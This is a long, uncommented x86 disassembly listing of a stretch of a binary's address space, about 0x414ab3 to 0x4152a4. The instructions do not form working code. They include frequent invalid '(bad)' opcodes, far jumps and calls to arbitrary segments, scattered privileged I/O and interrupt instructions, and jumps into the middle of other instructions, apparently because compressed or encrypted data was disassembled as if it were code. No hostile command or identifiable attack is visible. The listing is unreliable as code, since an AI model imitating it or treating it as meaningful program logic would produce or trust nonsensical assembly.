  414ab3:	jmp    0xcebd:0x3b1aa2ea
  414aba:	sub    cl,bl
  414abc:	pop    es
  414abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414abe:	push   esi
  414abf:	fcmovbe st,st(5)
  414ac1:	rcl    BYTE PTR [ebp-0x36],1
  414ac4:	sbb    ebx,ebx
  414ac6:	mov    ah,BYTE PTR [ebp+0x4fc8180c]
  414acc:	(bad)  
  414acd:	mov    cl,0xc9
  414acf:	xchg   BYTE PTR [ecx-0x370fe766],dl
  414ad5:	lods   eax,DWORD PTR ds:[esi]
  414ad6:	mov    esp,0x95293cbf
  414adb:	cli    
  414adc:	or     BYTE PTR ds:0x53ddc10f,bh
  414ae2:	xlat   BYTE PTR ds:[bx]
  414ae4:	or     DWORD PTR [esi],esi
  414ae6:	mov    edi,0xb0f673ba
  414aeb:	std    
  414aec:	sbb    eax,0xf724a5ce
  414af1:	inc    ebx
  414af2:	ja     0x414a8f
  414af4:	fcomip st,st(7)
  414af6:	push   ss
  414af7:	push   esp
  414af8:	cmc    
  414af9:	push   esp
  414afa:	mov    DWORD PTR [ebp+0x32],edi
  414afd:	sbb    eax,0x639f45fb
  414b02:	cli    
  414b03:	fimul  WORD PTR [edx+0x6ec77ae5]
  414b09:	mov    ebx,0x4c2b8328
  414b0e:	mov    ah,0x29
  414b10:	lea    esi,[ecx-0x7b]
  414b13:	inc    esi
  414b14:	dec    esp
  414b15:	mov    ds,WORD PTR [ebp+0x7d8c9276]
  414b1b:	pop    edx
  414b1c:	add    BYTE PTR [edi+0x58f2cb5d],bh
  414b22:	retf   
  414b23:	dec    ecx
  414b24:	sti    
  414b25:	push   es
  414b26:	icebp  
  414b27:	inc    ebp
  414b28:	inc    ebp
  414b29:	add    eax,0x1d62ecba
  414b2e:	inc    esi
  414b2f:	outs   dx,DWORD PTR ds:[esi]
  414b30:	sbb    al,0x1c
  414b32:	mov    bl,BYTE PTR [edi+0x4b]
  414b35:	call   0x64e9bb74
  414b3a:	pop    ecx
  414b3b:	xchg   ecx,eax
  414b3c:	mov    DWORD PTR [ebp-0x31da3ad4],0x1a357862
  414b46:	scas   al,BYTE PTR es:[edi]
  414b47:	pop    ebp
  414b48:	loop   0x414b9f
  414b4a:	fisttp QWORD PTR [ebp+0x39]
  414b4d:	mov    ds:0x1ccb4f22,eax
  414b52:	inc    edx
  414b53:	adc    ebp,DWORD PTR [ebp-0x77296a0b]
  414b59:	mov    edx,cs
  414b5b:	cs (bad) 
  414b5d:	std    
  414b5e:	jle    0x414b60
  414b60:	les    edi,FWORD PTR [eax-0x5f]
  414b63:	rol    DWORD PTR [edx-0x6c],cl
  414b66:	scas   eax,DWORD PTR es:[edi]
  414b67:	or     ecx,esi
  414b69:	inc    esp
  414b6a:	(bad)  
  414b6b:	shr    DWORD PTR [eax+0x18198d0f],cl
  414b71:	das    
  414b72:	mov    ah,0xb7
  414b74:	retf   0xbfb9
  414b77:	xor    DWORD PTR [eax],ecx
  414b79:	mov    cs,WORD PTR [edi+0x3aafd8a2]
  414b7f:	sbb    eax,0xd34b5ad9
  414b84:	mov    esp,0x50fb5b2
  414b89:	jmp    0x414b5b
  414b8b:	aas    
  414b8c:	xor    esp,esi
  414b8e:	stc    
  414b8f:	sub    eax,0x80b47b7e
  414b94:	mov    dh,0xbb
  414b96:	imul   eax,DWORD PTR [ebx+0x1ff2917b],0x5b35307a
  414ba0:	iret   
  414ba1:	sbb    ah,BYTE PTR [edi-0x53]
  414ba4:	or     esi,DWORD PTR ds:[eax+ebp*4+0x2ce65d65]
  414bac:	repnz clc 
  414bae:	xchg   esp,eax
  414baf:	and    DWORD PTR [edi+0x55],eax
  414bb2:	(bad)  
  414bb3:	call   0xe14eb6e2
  414bb8:	bound  ecx,QWORD PTR [edi+0x17]
  414bbb:	add    BYTE PTR ds:0x4d9cc505,0xe7
  414bc2:	mov    ch,0x5f
  414bc4:	call   0xd47e:0xacb3297a
  414bcb:	clc    
  414bcc:	pop    ss
  414bcd:	enter  0x5d4d,0x6f
  414bd1:	mov    eax,ds:0x7c29a13a
  414bd6:	ret    
  414bd7:	jmp    0x414c0a
  414bd9:	aad    0x9f
  414bdb:	lods   al,BYTE PTR ds:[esi]
  414bdc:	or     eax,0xdbc7672b
  414be1:	cs mov bh,0xb3
  414be4:	sub    al,ah
  414be6:	dec    ecx
  414be7:	inc    eax
  414be8:	mov    ebx,0x38c1aa1
  414bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bee:	pop    ecx
  414bef:	in     eax,0xca
  414bf1:	xor    DWORD PTR [ebx+0x2b],edx
  414bf4:	mov    dl,0x93
  414bf6:	adc    esi,DWORD PTR [edi+0x320c125d]
  414bfc:	inc    ebp
  414bfd:	sar    BYTE PTR [ecx+0x6fff1a57],1
  414c03:	test   BYTE PTR [eax+0x18],0xfe
  414c07:	pop    edx
  414c08:	out    0xa6,eax
  414c0a:	cmp    DWORD PTR es:[edx-0x65],ecx
  414c0e:	gs pop edx
  414c10:	jno    0x414c17
  414c12:	sahf   
  414c13:	mov    ebx,esp
  414c15:	mov    BYTE PTR [esi-0x3ccd9138],ch
  414c1b:	fmul   DWORD PTR [edx]
  414c1d:	xchg   edx,eax
  414c1e:	stos   DWORD PTR es:[edi],eax
  414c1f:	mov    dl,BYTE PTR [eax+ecx*1]
  414c22:	outs   dx,DWORD PTR ds:[esi]
  414c23:	test   BYTE PTR [esi-0x23],ch
  414c26:	scas   eax,DWORD PTR es:[edi]
  414c27:	add    al,0x2b
  414c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c2a:	mov    bh,BYTE PTR [ebp+0xc]
  414c2d:	mov    ecx,0xc0b51cb8
  414c32:	cmp    eax,0x6e06313
  414c37:	pop    eax
  414c38:	mov    eax,0xa3be15d3
  414c3d:	test   eax,0x472485e9
  414c42:	xchg   ebx,eax
  414c43:	test   BYTE PTR [ebp-0x80],dl
  414c46:	inc    ecx
  414c47:	repnz mov dh,0xba
  414c4a:	and    al,0x36
  414c4c:	(bad)  
  414c4d:	sbb    ebp,ecx
  414c4f:	(bad)  [ebx]
  414c51:	cs test al,0x65
  414c54:	ja     0x414c29
  414c56:	push   ecx
  414c57:	jmp    DWORD PTR [eax+ecx*8]
  414c5a:	xor    ebx,DWORD PTR [esi+0x38]
  414c5d:	cmp    ah,cl
  414c5f:	sub    bl,BYTE PTR [edx]
  414c61:	retf   
  414c62:	dec    ecx
  414c63:	mov    ah,0xe6
  414c65:	and    ecx,DWORD PTR [edi]
  414c67:	xchg   edx,eax
  414c68:	cli    
  414c69:	jbe    0x414cc5
  414c6b:	adc    eax,0x1464d7ff
  414c70:	adc    DWORD PTR ds:0x46703733,ebx
  414c76:	fild   WORD PTR [edi]
  414c78:	sub    DWORD PTR [ecx-0x6f],edi
  414c7b:	dec    edi
  414c7c:	scas   eax,DWORD PTR es:[edi]
  414c7d:	out    dx,al
  414c7e:	test   DWORD PTR [esi],ebp
  414c80:	cmp    eax,0xb8c2a94
  414c85:	sub    al,ah
  414c87:	jl     0x414ce1
  414c89:	fldenv [eax+0x66fe25c5]
  414c90:	fld    QWORD PTR [ebp-0x32]
  414c93:	daa    
  414c94:	fidivr WORD PTR [edx+0x42]
  414c97:	cli    
  414c98:	pop    esi
  414c99:	mov    esp,0xca4b7bc6
  414c9e:	daa    
  414c9f:	(bad)  
  414ca0:	test   BYTE PTR [eax-0x7f92bf75],0x28
  414ca7:	xchg   ebx,eax
  414ca8:	push   edi
  414ca9:	fldenv [esi]
  414cab:	scas   al,BYTE PTR es:[edi]
  414cac:	hlt    
  414cad:	jne    0x414c57
  414caf:	scas   al,BYTE PTR es:[di]
  414cb1:	sub    esp,DWORD PTR [eax]
  414cb3:	xchg   esi,eax
  414cb4:	cmp    BYTE PTR [ebx+edx*2-0x384388c5],0x13
  414cbc:	les    edi,FWORD PTR [edx-0x7b]
  414cbf:	out    dx,eax
  414cc0:	ds push ecx
  414cc2:	xor    ecx,ebx
  414cc4:	icebp  
  414cc5:	mov    WORD PTR [ecx+0x59a147],?
  414ccb:	outs   dx,BYTE PTR ds:[esi]
  414ccc:	out    0x1a,eax
  414cce:	call   0x282f65fe
  414cd3:	jmp    0x173bcfe7
  414cd8:	clc    
  414cd9:	mov    ebp,0x273580b5
  414cde:	sbb    eax,0x33e5d0b2
  414ce3:	cmp    esi,DWORD PTR [ebx-0x68]
  414ce6:	xor    BYTE PTR [edi-0x33647795],dl
  414cec:	and    eax,0xd625d7bc
  414cf1:	inc    edi
  414cf2:	cmp    eax,0xa0b19402
  414cf7:	fisubr WORD PTR [esi-0x59]
  414cfa:	ins    BYTE PTR es:[edi],dx
  414cfb:	push   ebp
  414cfc:	in     al,0xd
  414cfe:	fwait
  414cff:	addr16 mov edi,0x8d26523c
  414d05:	sahf   
  414d06:	jbe    0x414d65
  414d08:	(bad)  
  414d09:	push   eax
  414d0a:	pop    ecx
  414d0b:	pop    ss
  414d0c:	les    ebp,FWORD PTR [ecx-0xe]
  414d0f:	fsub   QWORD PTR [esi+edi*2-0x69]
  414d13:	jmp    0x414cd1
  414d15:	rcr    BYTE PTR [ebx],0x96
  414d18:	mov    ds:0x26a7e0e2,eax
  414d1d:	sub    DWORD PTR [ecx],esp
  414d1f:	push   ss
  414d20:	inc    edx
  414d21:	cmp    eax,0x67a0c3c7
  414d26:	or     BYTE PTR ss:[ebx],ah
  414d29:	(bad)  
  414d2a:	sub    BYTE PTR [edx+0x1ace7b35],ah
  414d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d31:	sbb    eax,0xf79885e2
  414d36:	cs aas 
  414d38:	push   ecx
  414d39:	adc    eax,0xe0d941c8
  414d3e:	jne    0x414d7a
  414d40:	in     eax,dx
  414d41:	data16 (bad) [ebp-0x10]
  414d45:	(bad)  
  414d46:	add    edi,DWORD PTR [edx-0x4b]
  414d49:	repz add ah,BYTE PTR [esi+ebp*4-0x4e]
  414d4e:	imul   eax,DWORD PTR [esi],0xffffffc8
  414d51:	cmc    
  414d52:	lahf   
  414d53:	adc    eax,0x1fcdc3e3
  414d58:	jns    0x414d4c
  414d5a:	pop    ds
  414d5b:	pop    edx
  414d5c:	pop    ecx
  414d5d:	push   es
  414d5e:	out    dx,al
  414d5f:	repnz stos BYTE PTR es:[edi],al
  414d61:	cwde   
  414d62:	cdq    
  414d63:	stos   BYTE PTR es:[edi],al
  414d64:	sub    BYTE PTR [edi-0x5d],cl
  414d67:	adc    edi,DWORD PTR [edi+0xdfdb54b]
  414d6d:	fmulp  st(4),st
  414d6f:	and    dh,BYTE PTR [ebx+0x1]
  414d72:	adc    esi,DWORD PTR [esi]
  414d74:	inc    ebp
  414d75:	mov    al,ds:0xa819e1b2
  414d7a:	jnp    0x414cfc
  414d7c:	(bad)  
  414d7d:	lock mov al,0x3f
  414d80:	jb     0x414d5b
  414d82:	fwait
  414d83:	pop    ds
  414d84:	adc    cl,BYTE PTR [eax+0x52ed167f]
  414d8a:	cmp    DWORD PTR [ebp-0x3b],0xffffffd4
  414d8e:	aaa    
  414d8f:	jecxz  0x414dbb
  414d91:	xor    DWORD PTR [eax-0x71b20e4f],esi
  414d97:	jb     0x414d60
  414d99:	sub    ch,ah
  414d9b:	lods   eax,DWORD PTR ds:[esi]
  414d9c:	mov    esi,0xce478a58
  414da1:	adc    ebx,DWORD PTR [esi+0x27e284a]
  414da7:	inc    esp
  414da8:	sbb    BYTE PTR [ebp+ebx*1+0x56],dh
  414dac:	add    DWORD PTR [ebx+0x7d],ebp
  414daf:	and    BYTE PTR [esi],bh
  414db1:	mul    BYTE PTR [edx]
  414db3:	daa    
  414db4:	pop    edx
  414db5:	jo     0x414de4
  414db7:	pop    ds
  414db8:	mov    ebp,0x45224109
  414dbd:	mov    ch,0x9f
  414dbf:	lods   al,BYTE PTR ds:[esi]
  414dc0:	jg     0x414d43
  414dc2:	add    al,0xc4
  414dc4:	outs   dx,BYTE PTR ds:[esi]
  414dc5:	loop   0x414e0f
  414dc7:	lods   eax,DWORD PTR ds:[esi]
  414dc8:	outs   dx,BYTE PTR ds:[esi]
  414dc9:	js     0x414ddd
  414dcb:	and    edi,DWORD PTR [eax]
  414dcd:	call   0x64b5f42b
  414dd2:	mov    ebx,0xb339e39b
  414dd7:	ds fmul st(7),st
  414dda:	sub    dl,BYTE PTR [edx-0x42]
  414ddd:	pop    ebx
  414dde:	push   ebp
  414ddf:	sbb    BYTE PTR [esi],bl
  414de1:	loope  0x414e1c
  414de3:	push   esp
  414de4:	loop   0x414dc2
  414de6:	adc    esi,ebp
  414de8:	data16 xor al,0x33
  414deb:	test   DWORD PTR cs:[esi],0xe1b3b693
  414df2:	or     al,0x53
  414df4:	and    DWORD PTR [edi-0x715b01a1],0x47
  414dfb:	sub    DWORD PTR [eax],ebx
  414dfd:	mov    edi,0x5e1ce5fd
  414e02:	inc    edi
  414e03:	lahf   
  414e04:	pop    edi
  414e05:	jmp    0xd92d:0x4be7bd1a
  414e0c:	test   eax,0xd69edbc8
  414e11:	and    BYTE PTR [ebx],dh
  414e13:	pop    ds
  414e14:	sbb    eax,0xd2299fd4
  414e19:	mov    ecx,0x1fe439b0
  414e1e:	xchg   ecx,eax
  414e1f:	xchg   ebp,eax
  414e20:	sub    al,0xc6
  414e22:	cmp    ebp,DWORD PTR [edi-0x7dec60c3]
  414e28:	mov    esi,0x50947fc8
  414e2d:	pushf  
  414e2e:	stos   BYTE PTR es:[edi],al
  414e2f:	inc    DWORD PTR [eax+0x10]
  414e32:	loope  0x414e3e
  414e34:	sub    eax,DWORD PTR [edx+ebp*1]
  414e37:	adc    eax,DWORD PTR [esi+0x6b4aad55]
  414e3d:	cmp    eax,0x3c1e46b6
  414e42:	jnp    0x414e4a
  414e44:	xor    dl,BYTE PTR [esp+edi*8+0x3b]
  414e48:	pusha  
  414e49:	or     esp,DWORD PTR [esi+0x5b764b0a]
  414e4f:	ret    0xeb39
  414e52:	repz fstp TBYTE PTR [edi]
  414e55:	sbb    BYTE PTR [edi-0x7eae6125],ah
  414e5b:	push   ds
  414e5c:	pop    ecx
  414e5d:	es xchg esp,eax
  414e5f:	je     0x414e52
  414e61:	dec    esi
  414e62:	push   0xf8dec1df
  414e67:	fwait
  414e68:	nop
  414e69:	dec    ecx
  414e6a:	cwde   
  414e6b:	mov    ebx,0x1cba8c46
  414e70:	in     eax,0x50
  414e72:	fiadd  DWORD PTR [esi-0x68]
  414e75:	pop    ds
  414e76:	pop    ebx
  414e77:	ins    BYTE PTR es:[di],dx
  414e79:	cmp    esp,DWORD PTR [esi+eax*1]
  414e7c:	repnz or al,0xcd
  414e7f:	lea    edi,[edi-0x8]
  414e82:	mov    ecx,0xd165b1c2
  414e87:	xor    al,0xa7
  414e89:	enter  0x714a,0xde
  414e8d:	push   0x6229144f
  414e92:	fcomp  DWORD PTR ds:0xfb8716df
  414e98:	push   edx
  414e99:	push   eax
  414e9a:	leave  
  414e9b:	xacquire lock sbb DWORD PTR fs:[edi-0x78772279],edi
  414ea4:	stos   BYTE PTR es:[edi],al
  414ea5:	dec    ebx
  414ea6:	sbb    eax,0xca1e4335
  414eab:	xor    BYTE PTR [eax-0x3d],bh
  414eae:	mov    ah,0xe4
  414eb0:	mov    ebp,0xe4d4916a
  414eb5:	and    ebp,eax
  414eb7:	dec    edi
  414eb8:	test   eax,0xf91319f
  414ebd:	fcom   QWORD PTR [edi-0x1e94a69f]
  414ec3:	pop    eax
  414ec4:	pop    ds
  414ec5:	into   
  414ec6:	in     al,dx
  414ec7:	xchg   edi,eax
  414ec8:	popf   
  414ec9:	into   
  414eca:	div    DWORD PTR [esi+0x32a75393]
  414ed0:	push   edi
  414ed1:	sub    al,0x6b
  414ed3:	inc    ecx
  414ed4:	dec    edi
  414ed5:	adc    bl,dl
  414ed7:	ds aad 0xa5
  414eda:	xchg   DWORD PTR [ebp+0x20],esi
  414edd:	jno    0x414ee5
  414edf:	xor    DWORD PTR [edi-0x10ef95d5],ebx
  414ee5:	es xchg ebx,eax
  414ee7:	fistp  WORD PTR [esi]
  414ee9:	cmp    eax,0xcac42875
  414eee:	ss es xor eax,0xb514ac15
  414ef5:	pop    esp
  414ef6:	mov    bh,0x50
  414ef8:	xor    ch,cl
  414efa:	enter  0x54a0,0xbd
  414efe:	sti    
  414eff:	jp     0x414f3b
  414f01:	push   ds
  414f02:	mov    DWORD PTR [edx-0x3db311c9],esp
  414f08:	ins    DWORD PTR es:[edi],dx
  414f09:	cld    
  414f0a:	loopne 0x414f54
  414f0c:	push   es
  414f0d:	loope  0x414f33
  414f0f:	lds    ebp,FWORD PTR [edx+eiz*1-0x311adabf]
  414f16:	ficom  WORD PTR ds:0xd213d34f
  414f1c:	repz call 0xd27:0xed362d1
  414f24:	sbb    al,0x28
  414f26:	push   ebx
  414f27:	pop    es
  414f28:	jl     0x414f75
  414f2a:	in     eax,dx
  414f2b:	imul   BYTE PTR [eax+0x6e]
  414f2e:	xchg   edx,eax
  414f2f:	jmp    0xef66a960
  414f34:	addr16 das 
  414f36:	push   0x33a496f2
  414f3b:	es mov al,bl
  414f3e:	lea    edi,[edx+eiz*4+0x227ab34e]
  414f45:	xor    eax,0xf8068417
  414f4a:	mov    eax,0xaf79c016
  414f4f:	call   0x2366b4b1
  414f54:	pushf  
  414f55:	aaa    
  414f56:	push   edi
  414f57:	or     esi,DWORD PTR [esi-0x77]
  414f5a:	mov    ah,0xd
  414f5c:	or     BYTE PTR [esi],bh
  414f5e:	adc    DWORD PTR [ecx],eax
  414f60:	push   eax
  414f61:	pop    ss
  414f62:	daa    
  414f63:	call   0xc829:0xcfffdd59
  414f6a:	(bad)  
  414f6b:	lahf   
  414f6c:	pop    eax
  414f6d:	dec    esp
  414f6e:	mov    esp,0x5a5683d8
  414f73:	call   0x53a8330f
  414f78:	fild   QWORD PTR [esi-0x44]
  414f7b:	xchg   edx,eax
  414f7c:	xchg   ebx,ecx
  414f7e:	push   DWORD PTR [edx-0x10bcfac9]
  414f84:	dec    ecx
  414f85:	test   al,0x4
  414f87:	add    esp,DWORD PTR [ebx]
  414f89:	les    ebp,FWORD PTR [esi+ebp*1]
  414f8c:	jbe    0x414f87
  414f8e:	call   0xa3525bce
  414f93:	fwait
  414f94:	or     al,cl
  414f96:	mov    bl,BYTE PTR [ebp+edi*1-0x34684cac]
  414f9d:	mov    dh,0xc3
  414f9f:	xor    bh,dh
  414fa1:	fwait
  414fa2:	inc    esp
  414fa3:	add    ecx,ecx
  414fa5:	sahf   
  414fa6:	test   al,0x59
  414fa8:	mov    ch,BYTE PTR ds:0x7289a94c
  414fae:	inc    esi
  414faf:	pop    eax
  414fb0:	loope  0x414fdc
  414fb2:	ins    BYTE PTR es:[edi],dx
  414fb3:	cmc    
  414fb4:	test   DWORD PTR [eax-0x5d],ecx
  414fb7:	scas   eax,DWORD PTR es:[edi]
  414fb8:	fcmovbe st,st(4)
  414fba:	jl     0x414faf
  414fbc:	aas    
  414fbd:	sub    DWORD PTR [edx-0x5a],ebp
  414fc0:	inc    esp
  414fc1:	xor    ebx,DWORD PTR [eax+esi*2-0x33]
  414fc5:	jg     0x415007
  414fc7:	push   ebx
  414fc8:	sub    eax,0xc643e913
  414fcd:	scas   eax,DWORD PTR es:[edi]
  414fce:	into   
  414fcf:	dec    ecx
  414fd0:	and    al,0x5e
  414fd2:	ss inc esi
  414fd4:	and    edx,DWORD PTR [eiz*8+0x510c7eab]
  414fdb:	or     eax,0xee82dc05
  414fe0:	frstor [ebx-0x4af8e2ba]
  414fe6:	call   DWORD PTR [esi]
  414fe8:	mov    bl,0x91
  414fea:	adc    al,BYTE PTR [ebx-0x51]
  414fed:	mov    edi,0xbcb0df6d
  414ff2:	cmp    edi,DWORD PTR [edx-0x12]
  414ff5:	stos   BYTE PTR es:[edi],al
  414ff6:	lock xor ebx,edx
  414ff9:	push   edx
  414ffa:	push   esi
  414ffb:	sub    ah,BYTE PTR [edi]
  414ffd:	shl    DWORD PTR [ebp-0x6308a01f],cl
  415003:	loopne 0x415007
  415005:	repnz xlat BYTE PTR ds:[ebx]
  415007:	mov    eax,0x2a48b08a
  41500c:	fwait
  41500d:	sar    DWORD PTR [eax],cl
  41500f:	jp     0x414fec
  415011:	cmp    al,BYTE PTR [eax+0x1b2e8f7e]
  415017:	pop    edx
  415018:	inc    ebx
  415019:	loope  0x415006
  41501b:	and    bh,bh
  41501d:	or     eax,0x60674056
  415022:	jbe    0x415002
  415024:	aad    0x1d
  415026:	inc    esp
  415027:	sbb    ah,cl
  415029:	stc    
  41502a:	in     al,0x9a
  41502c:	inc    eax
  41502d:	or     edi,DWORD PTR [esi+0x5d]
  415030:	scas   al,BYTE PTR es:[edi]
  415031:	in     eax,dx
  415032:	in     eax,dx
  415033:	mov    edi,DWORD PTR [eax-0x5a741a1b]
  415039:	sahf   
  41503a:	pop    esi
  41503b:	cld    
  41503c:	sar    DWORD PTR [ecx+0x6f3b86eb],cl
  415042:	les    esi,FWORD PTR [edi-0x3f]
  415045:	sbb    al,0x62
  415047:	xchg   DWORD PTR [esi+0x5c65a5],ebx
  41504d:	push   esi
  41504e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41504f:	mov    esp,0x614b4e3f
  415054:	or     DWORD PTR [esi+ecx*4+0x1d],esp
  415058:	fs pop ecx
  41505a:	jns    0x4150ba
  41505c:	pop    eax
  41505d:	inc    ebx
  41505e:	jo     0x415008
  415060:	jle    0x4150c1
  415062:	mov    ch,0xe2
  415064:	mov    ch,0x2e
  415066:	mov    esi,0x8d10a934
  41506b:	int    0x58
  41506d:	and    DWORD PTR [ebx],esi
  41506f:	and    eax,0xeb3ddf95
  415074:	adc    dl,bh
  415076:	mov    BYTE PTR [edi-0x4ee3e356],0x51
  41507d:	adc    BYTE PTR [edx],cl
  41507f:	and    BYTE PTR [ebx],dh
  415081:	les    edx,FWORD PTR [edi]
  415083:	jo     0x41502a
  415085:	leave  
  415086:	ror    DWORD PTR [edi-0x7],cl
  415089:	adc    ah,bh
  41508b:	das    
  41508c:	jno    0x415051
  41508e:	xor    bh,BYTE PTR ds:0x7c7a3356
  415094:	dec    esi
  415095:	xchg   esi,eax
  415096:	scas   eax,DWORD PTR es:[edi]
  415097:	inc    esp
  415098:	xchg   edi,eax
  415099:	push   eax
  41509a:	jle    0x415031
  41509c:	(bad)  
  41509d:	jmp    0x4150f8
  41509f:	inc    edx
  4150a0:	popf   
  4150a1:	sub    ebp,0xffffffcf
  4150a4:	cmp    DWORD PTR gs:[ebx+0x68],ebx
  4150a8:	cmp    eax,0x164acdb0
  4150ad:	js     0x415107
  4150af:	div    DWORD PTR [eax+0x45b5780a]
  4150b5:	call   0xdf8bca85
  4150ba:	shl    BYTE PTR [ecx-0x8],0x1e
  4150be:	xor    bl,BYTE PTR [eiz*2-0x79072675]
  4150c5:	fdivr  QWORD PTR [esi+edi*1+0x736452f3]
  4150cc:	add    eax,0x8bf005c5
  4150d1:	in     eax,0x12
  4150d3:	out    0xd4,eax
  4150d5:	mov    dl,BYTE PTR [ecx-0x5104ce7f]
  4150db:	bound  esi,QWORD PTR [esi-0x6f]
  4150de:	ror    ecx,cl
  4150e0:	mov    ecx,0xf2bca0f2
  4150e5:	mov    dh,0xbf
  4150e7:	pop    ds
  4150e8:	sub    DWORD PTR [edi],edi
  4150ea:	mov    dl,0x69
  4150ec:	mov    cs,WORD PTR ds:0xf7e17254
  4150f2:	inc    edx
  4150f3:	push   cs
  4150f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f5:	inc    eax
  4150f6:	jle    0x41510c
  4150f8:	xor    ch,al
  4150fa:	sub    DWORD PTR [ecx+ebx*8+0x3f36c6be],edx
  415101:	leave  
  415102:	mov    bl,0xfb
  415104:	jae    0x415165
  415106:	call   0xcdc910c4
  41510b:	outs   dx,BYTE PTR ds:[esi]
  41510c:	and    bh,BYTE PTR [esi]
  41510e:	ins    BYTE PTR es:[edi],dx
  41510f:	cld    
  415110:	cmp    eax,0xfe0df492
  415115:	std    
  415116:	inc    edx
  415117:	aam    0xcd
  415119:	inc    ecx
  41511a:	sub    ecx,DWORD PTR [edx+0x2f05ff84]
  415120:	and    DWORD PTR [edx],0xffffffd7
  415123:	push   ebp
  415124:	loope  0x4150f5
  415126:	add    al,0x6b
  415128:	xor    ch,ah
  41512a:	ins    DWORD PTR es:[edi],dx
  41512b:	pop    ds
  41512c:	push   cs
  41512d:	or     BYTE PTR [eax],ch
  41512f:	icebp  
  415130:	cdq    
  415131:	pop    ebp
  415132:	xor    al,BYTE PTR [ebx+0x73]
  415135:	aaa    
  415136:	in     eax,dx
  415137:	enter  0x68e3,0x4d
  41513b:	inc    edi
  41513c:	test   eax,0xddb624bd
  415141:	jge    0x41519e
  415143:	(bad)  
  415144:	inc    esi
  415145:	not    bl
  415147:	push   ecx
  415148:	loope  0x415126
  41514a:	push   ecx
  41514b:	test   al,al
  41514d:	es dec ebp
  41514f:	or     esi,DWORD PTR [ecx-0x16]
  415152:	test   eax,0xabde3bc3
  415157:	mov    esp,0x682a0152
  41515c:	xchg   ebp,eax
  41515d:	fs push 0xffffffdf
  415160:	mov    ah,0x85
  415162:	sub    DWORD PTR [edx+0x6c],edx
  415165:	or     ebp,DWORD PTR [edx]
  415167:	add    DWORD PTR [edi+edx*4-0x78],esi
  41516b:	push   0xfffffffa
  41516d:	adc    ah,BYTE PTR [ecx-0x5]
  415170:	mov    eax,ds:0x605edf9e
  415175:	push   eax
  415176:	add    ch,al
  415178:	out    dx,eax
  415179:	add    BYTE PTR [ebx+0x4df22763],ch
  41517f:	and    al,BYTE PTR [ebp-0x13883f9c]
  415185:	fcom   DWORD PTR [edi+ebp*4+0x42ff0a2c]
  41518c:	pop    ebp
  41518d:	(bad)  
  41518e:	stc    
  41518f:	addr16 jb 0x4151b5
  415192:	idiv   DWORD PTR [edx]
  415194:	pop    es
  415195:	inc    esp
  415196:	pop    es
  415197:	inc    eax
  415198:	fimul  DWORD PTR ds:0xcc7ae634
  41519e:	cli    
  41519f:	fstp   TBYTE PTR [ebx+0x3e05c578]
  4151a5:	nop
  4151a6:	aaa    
  4151a7:	push   edi
  4151a8:	sbb    DWORD PTR [ebx+ebp*2],esp
  4151ab:	adc    BYTE PTR [edx-0x9c89007],dh
  4151b1:	xchg   ebx,eax
  4151b2:	adc    ah,ch
  4151b4:	add    DWORD PTR [edi+0x8117a57],0x2d29c94
  4151be:	cli    
  4151bf:	dec    ecx
  4151c0:	popf   
  4151c1:	pop    edx
  4151c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151c3:	adc    ebx,DWORD PTR [edx-0x43204c27]
  4151c9:	and    ah,0xd9
  4151cc:	push   ss
  4151cd:	sbb    esi,DWORD PTR [edi-0x7380977a]
  4151d3:	in     al,dx
  4151d4:	and    BYTE PTR [edx+0x5f1b225],dl
  4151da:	inc    eax
  4151db:	mov    ds:0x845b4120,eax
  4151e0:	mov    eax,ds:0x2354c02c
  4151e5:	lock (bad) [ebx+0x6f25602]
  4151ec:	jmp    0x8950:0x77cc2372
  4151f3:	test   ch,dl
  4151f5:	inc    esi
  4151f6:	push   eax
  4151f7:	sar    BYTE PTR [edi-0x38],cl
  4151fa:	sti    
  4151fb:	and    eax,0xd3bf004
  415200:	aam    0x7c
  415202:	add    eax,0xf2a83443
  415207:	or     DWORD PTR [eax+ecx*2+0x2b],0x53a36969
  41520f:	inc    esp
  415210:	lds    eax,FWORD PTR [eax]
  415212:	and    BYTE PTR [edx+ebp*8-0x3e84b3c8],cl
  415219:	xchg   ah,cl
  41521b:	repz pop edx
  41521d:	imul   esi,edx,0x27753cac
  415223:	sbb    dl,BYTE PTR [ecx+eiz*2+0x1cc8e50d]
  41522a:	push   esp
  41522b:	test   al,0x3e
  41522d:	fnstsw WORD PTR [ebp-0xb771a52]
  415233:	push   edx
  415234:	cmp    BYTE PTR [edi+0x67],ah
  415237:	jge    0x4151fc
  415239:	(bad)  
  41523a:	xchg   ebx,eax
  41523b:	scas   al,BYTE PTR es:[edi]
  41523c:	cld    
  41523d:	jae    0x415228
  41523f:	mov    ch,0x27
  415241:	idiv   ah
  415243:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415244:	test   al,0xe5
  415246:	test   al,0xf2
  415248:	and    al,0xb7
  41524a:	pop    eax
  41524b:	or     DWORD PTR [ecx+0x20],esp
  41524e:	imul   edi,DWORD PTR [edi-0x4ad789c6],0x8b80fb07
  415258:	adc    eax,0xfe856494
  41525d:	sahf   
  41525e:	daa    
  41525f:	jb     0x415281
  415261:	or     ah,bl
  415263:	pop    ebx
  415264:	aaa    
  415265:	or     DWORD PTR [edi+ebp*4-0x5a39351a],edx
  41526c:	data16 sbb bh,BYTE PTR [ebp-0x74]
  415270:	pop    edx
  415271:	add    DWORD PTR [esi+0x12],ebx
  415274:	dec    edi
  415275:	sub    eax,0x7eecf5c5
  41527a:	mov    es,WORD PTR [edi-0x7b]
  41527d:	into   
  41527e:	scas   eax,DWORD PTR es:[edi]
  41527f:	xor    dl,BYTE PTR [ecx-0x52]
  415282:	ja     0x4152dd
  415284:	hlt    
  415285:	fisttp QWORD PTR [eax]
  415287:	call   0xa8ef9857
  41528c:	sub    al,0x49
  41528e:	sub    cl,BYTE PTR [esi+0x22]
  415291:	test   eax,0xc18ae2f7
  415296:	and    DWORD PTR [edi],edi
  415298:	cwde   
  415299:	stc    
  41529a:	sahf   
  41529b:	aam    0x3c
  41529d:	add    BYTE PTR [ebx-0x67],dl
  4152a0:	dec    esp
  4152a1:	jge    0x4152f8
  4152a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152a4:	push   cs
